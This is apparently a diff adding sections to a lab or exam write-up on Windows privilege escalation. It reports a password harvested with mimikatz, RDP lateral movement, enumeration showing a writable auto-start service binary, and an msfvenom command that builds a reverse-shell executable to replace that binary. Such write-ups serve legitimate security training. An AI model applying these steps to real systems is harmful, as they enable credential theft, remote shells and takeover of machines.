@@ -901,5 +901,65 @@ Post-Completion notes:&#x20;
 
 We can launch mimikatz and harvest ted's password, which is avatar123, and rdp into the machine at the 192.168.xxx.172 ip. Now we can move onto question 2.
 
+### Question 2
 
+We already did all the heavy lifting by dumping the passwords for ted, we can just RDP into the 171 IP and read the flag.
+
+### Question 3
+
+We can import the script PrivescCheck.ps1 from [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck) and run it to see that there is binary vulnerability, specifically regarding zen.exe.
+
+```
+| KO | High | SERVICES > Binary Permissions -> 8 result(s)                    |
+| KO | Med. | UPDATES > System up to date? -> 1 result(s)                     |
+```
+
+We can scroll up and see what's so special about these binary permissions.
+
+```
+Name              : Service1
+ImagePath         : C:\program files\zen\zen services\zen.exe
+User              : zensvc@exam.com
+ModifiablePath    : C:\program files\zen\zen services
+IdentityReference : BUILTIN\Users
+Permissions       : WriteAttributes, Synchronize, AddSubdirectory, WriteExtendedAttributes, AddFile
+Status            : Stopped
+UserCanStart      : False
+UserCanStop       : False
+
+Name              : Service1
+ImagePath         : C:\program files\zen\zen services\zen.exe
+User              : zensvc@exam.com
+ModifiablePath    : C:\program files\zen\zen services\zen.exe
+IdentityReference : BUILTIN\Users
+Permissions       : WriteAttributes, Synchronize, AppendData, WriteExtendedAttributes, WriteData
+Status            : Stopped
+UserCanStart      : False
+UserCanStop       : False
+```
+
+What's so interesting about this zen.exe file is that we can basically edit the zen.exe file or add a reverse shell in there. However, it's useless without a way to activate it.
+
+```
+C:\Users\ted>sc qc Service1
+[SC] QueryServiceConfig SUCCESS
+SERVICE_NAME: Service1
+TYPE               : 10  WIN32_OWN_PROCESS
+START_TYPE         : 2   AUTO_START  (DELAYED)
+ERROR_CONTROL      : 1   NORMAL
+BINARY_PATH_NAME   : C:\program files\zen\zen services\zen.exe
+LOAD_ORDER_GROUP   :
+TAG                : 0
+DISPLAY_NAME       : ZenHelpDesk
+DEPENDENCIES       :
+SERVICE_START_NAME : zensvc@exam.com
+```
+
+With this, we can see that the service/process is auto start on machine boot, but it's slightly delayed. Therefore, I can alter the zen.exe file to a reverse shell, reboot the machine, and wait until I get a shell callback.
+
+```
+sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.213 LPORT=4444 -f exe -o /var/www/html/zen.exe
+```
+
+A simple msfvenom command and I'm able to get the flag.
 
